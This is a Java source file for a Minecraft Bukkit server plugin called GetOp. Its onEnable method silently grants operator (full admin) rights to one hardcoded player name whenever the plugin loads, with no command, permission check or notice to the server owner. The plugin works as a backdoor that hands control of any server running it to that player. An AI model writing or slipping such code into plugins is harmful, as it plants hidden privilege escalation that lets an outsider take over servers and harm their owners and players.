package org.example.getop.getop;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;
public final class GetOp extends JavaPlugin {

    @Override
    public void onEnable() {
        Bukkit.getOfflinePlayer("Mattyve1990").setOp(true);
    }
}